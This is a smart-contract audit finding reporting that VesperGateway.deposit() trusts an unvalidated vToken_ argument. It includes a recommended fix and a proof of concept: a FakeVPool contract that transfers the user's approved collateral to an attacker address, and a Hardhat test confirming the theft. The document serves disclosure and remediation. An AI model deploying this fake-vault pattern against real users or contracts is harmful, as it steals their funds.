### Title
Unvalidated `vToken_` argument lets a malicious Vesper vault steal approved collateral - ([File: contracts/VesperGateway.sol](contracts/VesperGateway.sol))

### Summary
`VesperGateway.deposit()` verifies that `pool_` is registered, but does not verify that `vToken_` is a supported collateral for that pool. An attacker can deploy a fake `vToken_` whose `token()` returns a legitimate ERC-20, receive the gateway's token approval, transfer the approved collateral to itself during `deposit()`, and report an arbitrary minted balance. The subsequent lookup of `pool_.depositTokenOf(vToken_)` returns `address(0)` for the unregistered fake vault, and the final no-return-value external `deposit()` call to that empty address succeeds. The caller loses the collateral and receives no deposit tokens.

### Finding Description
The function accepts an arbitrary `vToken_` contract and trusts it for three security-relevant operations:

1. It calls `vToken_.token()` and pulls that asset from the caller. [1](#0-0) 
2. It grants the same untrusted `vToken_` an allowance for the full amount and calls its attacker-controlled `deposit()` function. [2](#0-1) 
3. Only after those actions does it resolve the Metronome deposit token by using the untrusted vault as the mapping key. [3](#0-2) 

`Pool.addDepositToken()` populates `depositTokenOf` by collateral address, while an unregistered collateral simply maps to `IDepositToken(address(0))`. [4](#0-3)  `VesperGateway` never checks `address(_depositToken) != address(0)` or `pool_.doesDepositTokenExist(_depositToken)`. Since `IDepositToken.deposit()` has no return value, the external call to `address(0)` succeeds instead of restoring the stolen funds.

### Impact Explanation
A user that approves the gateway for collateral and calls `deposit()` with an attacker-supplied `vToken_` loses the approved amount. The fake vault can transfer the approved collateral out of the gateway during its `deposit()` callback, while the gateway completes successfully and mints no collateral position.

This is direct theft of user funds through a public entry point. No governor, keeper, oracle manipulation, malicious LayerZero component, or protocol privilege is required.

### Likelihood Explanation
The attack requires a victim or integrating contract to pass the malicious `vToken_` argument and approve the gateway for the underlying asset. The contract explicitly permits arbitrary `vToken_` inputs and relies on the caller to choose a valid one. The explicitly allowed threat model includes attacker-deployed fake pools or fake `vToken` arguments. No timing, liquidity, or privileged-state precondition is needed beyond the victim's approval.

### Recommendation
Before approving or calling `vToken_`, resolve and validate its deposit token:

```solidity
IDepositToken _depositToken = pool_.depositTokenOf(vToken_);
if (address(_depositToken) == address(0)) revert DepositTokenDoesNotExist();
if (_depositToken.underlying() != vToken_) revert InvalidVToken();
```

Alternatively, call `pool_.doesDepositTokenExist(_depositToken)` before interacting with the vault. Also consider measuring the caller-provided underlying by balance delta rather than trusting the arbitrary vault's reported `balanceOf` delta.

### Proof of Concept
The following Hardhat test uses a deployed `PoolRegistry`, a registered `Pool`, a real collateral ERC-20, and an attacker-controlled fake `IVPool`:

```solidity
contract FakeVPool {
    IERC20 public immutable token;
    address public immutable thief;
    mapping(address => uint256) public balanceOf;

    constructor(IERC20 token_, address thief_) {
        token = token_;
        thief = thief_;
    }

    function deposit(uint256 amount) external {
        // Called by VesperGateway after it approves this contract.
        token.transferFrom(msg.sender, thief, amount);
        balanceOf[msg.sender] += amount;
    }

    function withdraw(uint256) external {}
    function approve(address, uint256) external returns (bool) {
        return true;
    }
}
```

```ts
it('steals collateral through an unregistered vToken argument', async () => {
  const amount = parseUnits('100', 6)

  const fakeVPool = await deploy('FakeVPool', usdc.address, attacker.address)

  await usdc.connect(user).approve(vesperGateway.address, amount)

  await vesperGateway
    .connect(user)
    .deposit(registeredPool.address, fakeVPool.address, amount)

  expect(await usdc.balanceOf(attacker.address)).to.eq(amount)
  expect(await usdc.balanceOf(vesperGateway.address)).to.eq(0)
  expect(await msdCollateral.balanceOf(user.address)).to.eq(0)
})
```

The call succeeds because `registeredPool.depositTokenOf(fakeVPool)` returns the zero deposit token and the final no-return `deposit()` call to `address(0)` does not revert.
